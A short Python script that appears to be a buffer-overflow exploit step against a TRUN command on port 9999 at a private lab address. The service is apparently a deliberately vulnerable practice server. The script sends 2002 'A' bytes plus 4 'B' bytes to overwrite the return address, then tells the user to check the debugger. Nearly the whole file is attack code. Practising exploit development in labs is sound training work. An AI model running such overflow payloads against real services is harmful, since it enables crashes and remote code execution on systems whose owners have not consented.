#!/usr/bin/python3

import socket
from socket import timeout

payload = "A" * 2002 + "B" * 4

try:    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect(('10.0.2.29',9999))
    payload = "TRUN /.../" + payload
    s.send((payload.encode()))
    print ("Payload was send, check the debugger")
except timeout:
    print ("Cannot connect to server")
    s.close()
    